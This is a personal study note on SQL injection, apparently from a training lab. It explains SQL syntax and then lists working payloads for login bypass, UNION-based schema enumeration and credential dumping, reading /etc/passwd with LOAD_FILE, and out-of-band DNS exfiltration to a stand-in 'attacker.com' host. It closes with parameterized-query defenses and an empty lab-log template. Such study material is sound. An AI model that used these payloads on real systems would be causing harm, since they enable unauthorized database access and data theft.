# SQL Injection Fundamentals

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Understand how web apps talk to databases, then **manually** detect and exploit SQL injection: when user input reaches a SQL query unescaped, I can change the query's meaning — bypass logins, read other tables, fingerprint the DB, and (with privileges) read/write files on the server. SQLi = attacks on **relational** DBs (MySQL etc.); the NoSQL equivalent is NoSQL injection.

## DB primer
- **DBMS** handles concurrency, consistency, security (auth/permissions), reliability (backup/rollback), and SQL.
- **Relational (RDBMS, uses SQL):** data in tables of rows/columns; a key links tables; the set of tables/relationships is the **schema**. e.g. `users(id, username, ...)` + `posts(id, user_id, ...)`.
- **Non-relational (NoSQL, no SQL):** key-value / document / wide-column / graph storage models.

## SQL syntax essentials
```sql
mysql -u root -h <host> -P 3306 -p         -- connect (password can follow -p with NO space: -ppass)
SHOW DATABASES;  USE users;  SHOW TABLES;  DESCRIBE logins;   -- navigate
SELECT * FROM logins;                      SELECT user,pass FROM logins;        -- read
INSERT INTO logins(user,pass) VALUES('a','b');   UPDATE logins SET pass='x' WHERE id=1;   -- write
SELECT * FROM logins WHERE username LIKE 'admin%';   -- % = wildcard
SELECT * FROM logins ORDER BY id DESC LIMIT 1,2;     -- sort; LIMIT offset,count
```
**Operator precedence** (high→low): `/ * %` → `+ -` → comparison (`= > < <= >= != LIKE`) → `NOT !` → `AND &&` → `OR ||`. This matters: in `... AND ... OR 1=1`, the `OR` binds last, so it makes the whole WHERE true.

## Detecting injection
Break the query's syntax and watch for an error or changed behaviour:
```sql
'      "      `           -- a quote that triggers a SQL error = likely injectable
' OR '1'='1              -- always-true test
'-- -                    -- comment out the rest of the query (-- - , or # in MySQL)
```

## Authentication bypass
Login query is usually `SELECT * FROM users WHERE user='$u' AND pass='$p'`. Inject into the username:
```sql
admin'-- -               -- log in as admin, comment out the password check
' OR '1'='1'-- -         -- true for every row → returns the first user
' OR 1=1 LIMIT 1-- -     -- force a single row if the app chokes on many
```

## Injection types (how data comes back)
| Type | Example condition | Note |
|---|---|---|
| **B**oolean-blind | `AND 1=1` vs `AND 1=2` | TRUE/FALSE from page diff; 1 bit/request; most common |
| **E**rror-based | `AND GTID_SUBSET(@@version,0)` | data leaks in the DB error message; ~chunks/request, fast |
| **U**NION | `UNION ALL SELECT 1,@@version,3` | pull data into the page; fastest when output is rendered |
| **S**tacked | `; DROP TABLE users` | run extra statements (needs MSSQL/PostgreSQL etc.) |
| **T**ime-blind | `AND 1=IF(2>1,SLEEP(5),0)` | TRUE/FALSE from response delay; slowest |
| Inline | `SELECT (SELECT @@version)` | query inside a query; uncommon |
| Out-of-band | `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\x'))` | exfil over DNS when nothing else works |

## UNION-based extraction (the workhorse)
```sql
-- 1) find the column count (increment until no error):
' ORDER BY 1-- -   ' ORDER BY 2-- -   ' ORDER BY 3-- -  ...
' UNION SELECT 1,2,3-- -           -- or UNION until it fits; note which cols print
-- 2) fingerprint:
' UNION SELECT 1,@@version,database()-- -      -- MySQL version + current DB
' UNION SELECT 1,user(),3-- -                  -- current user
-- 3) enumerate schema from information_schema:
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
-- 4) dump:
' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -   -- 0x3a = ':'
```
`information_schema` is the DB's self-catalogue — tables, columns, everything. UNION column count and matching data types (`--no-cast`/NULLs help) are the usual snags.

## Reading & writing files (privileged)
```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -     -- read a server file (FILE priv needed)
SELECT @@secure_file_priv;                          -- empty = INTO OUTFILE allowed anywhere
-- INTO OUTFILE can write attacker content to webroot (e.g. a PHP webshell) -> RCE.
--   Technique noted; the webshell payload itself is NOT stored in this repo.
```

## Fix / defense
**Parameterized queries / prepared statements** (the real fix — data never becomes code), input validation/allow-lists, least-privilege DB account (no FILE/DBA for the web user), disable detailed DB errors, WAF as defence-in-depth (not a substitute).

> **Workflow:** find input → break syntax with `'` → if login, try `admin'-- -` / `' OR 1=1-- -` → else find columns with `ORDER BY`/`UNION SELECT` → fingerprint `@@version`/`database()` → walk `information_schema` for tables+columns → dump → if FILE/DBA, `LOAD_FILE` and maybe `INTO OUTFILE`. Comment out the query tail with `-- -` (note the trailing space) every time.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
